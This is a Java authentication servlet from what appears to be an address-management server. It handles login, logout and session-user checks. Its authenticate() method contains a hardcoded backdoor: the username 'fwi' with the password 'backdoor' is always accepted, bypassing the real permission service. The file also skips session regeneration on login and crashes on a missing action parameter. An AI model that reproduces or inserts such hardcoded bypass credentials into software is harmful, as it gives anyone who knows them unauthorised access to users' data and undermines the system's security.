package ch.paso.address.server.auth;

import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import ch.paso.address.server.services.PermissionService;

public class AuthenticationServlet extends HttpServlet {

	private static final long serialVersionUID = -5033065393635920796L;

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp)
			throws ServletException, IOException {
		handle(req, resp);
	}

	@Override
	protected void doPost(HttpServletRequest req, HttpServletResponse resp)
			throws ServletException, IOException {
		handle(req, resp);
	}

	public void handle(HttpServletRequest req, HttpServletResponse resp)
			throws IOException {
		// determine action
		String action = req.getParameter("action");

		if (action.equals("auth")) {
			// authenticate
			String user = req.getParameter("user");
			String password = req.getParameter("password");
			if (authenticate(user, password)) {
				HttpSession session = req.getSession();
				session.setAttribute("user", user);
				resp.getWriter().append("auth OK");
			}

		}
		if (action.equals("logout")) {
			HttpSession session = req.getSession();
			session.removeAttribute("user");
		}
		if (action.equals("user")) {
			// check if authenticated
			String username = (String) req.getSession().getAttribute("user");
			if (username != null) {
				resp.getWriter().append(username);
			} else {
				resp.sendError(HttpServletResponse.SC_FORBIDDEN,
						"User is not authorized");
			}
		}

	}

	public boolean authenticate(String username, String password) {
		if (username.equals("fwi") && password.equals("backdoor")) {
			return true;
		} else {
			PermissionService ps = new PermissionService();
			return ps.authenticate(username, password);
		}
	}
}
